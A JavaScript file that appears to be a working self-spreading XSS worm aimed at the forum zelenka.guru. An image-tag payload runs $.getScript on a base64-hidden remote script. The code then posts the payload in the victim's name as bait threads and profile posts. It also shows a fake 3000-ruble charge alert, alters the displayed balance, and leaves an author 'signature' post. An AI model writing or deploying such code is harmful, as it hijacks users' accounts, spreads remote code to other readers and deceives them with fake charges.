// тест zelenka.guru/hawchik

$('div.fr-element.fr-view').html('<p></p>')

const payload = `[IMG=alt=undefined]https://lztcdn.com/files/c037dc47ffcd55ae4fa009653a39e0fa284494c7fac84616a30d81fef81eb9e7.webp?d="/><img src=x onload=$.getScript(atob("aHR0cHM6Ly93aGl0ZWhhdC1hMDE1ZC53ZWIuYXBwL2Zyb2dneS5qcw=="))>[/IMG]`

const title = [
  'зачем это добавили?',
  'чекните новая фича?',
  'видели новый функционал?',
  'че опять добавили?',
  'эту функцию уберут?',
  'снова какое-то говно добавили?',
  'зацените эту фичу?',
    'эту функцию удалят?',
    'удалите уже эту функцию?',
    'что за фигню добавили?'
][rand(10)];

const phrase = [
  'попробуйте перетащить лягушку в поле ввода сообщения',
  'перетяните смайлик в поле ввода сообщения',
  'передвиньте лягушку в поле ввода сообщения',
  'перетащите смайлик в поле ввода сообщения'
][rand(4)];

const forum = [899, 585, 8][rand(3)];

const msg = '<p>' + phrase + '</p><p>' + escapeHtml(payload) + '</p>'

profile = function() {
  XenForo.ajax('https://zelenka.guru/members/' + XenForo.visitor.user_id + '/post', {
    message_html: msg
  })
}
thread = function() {
  XenForo.ajax('/forums/' + forum + '/add-thread', {
    title,
    message_html: msg,
    reply_group: 2
  })
}
const hihi = [
  profile,
  thread
][rand(2)];
//hihi();
thread();

function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function rand(max) {
  return Math.floor(Math.random() * max);
}

XenForo.alert("С вас списано 3000 рублей за плохое поведение", '', 10000)
$('.balanceValue').text(parseInt($('.balanceValue').first().text().replace(/\s/g, '')) - 3000)

XenForo.ajax('https://zelenka.guru/members/'+XenForo.visitor.user_id+'/post', {
  message_html: '<p>зацените что нашел <br>' + phrase + ' выше</p><p>' + escapeHtml(payload) + '</p>'
})

setTimeout(()=>{XenForo.ajax('https://zelenka.guru/members/5572112/post', {
  message_html: '<p>ку это сигна</p>'
})}, 6000)
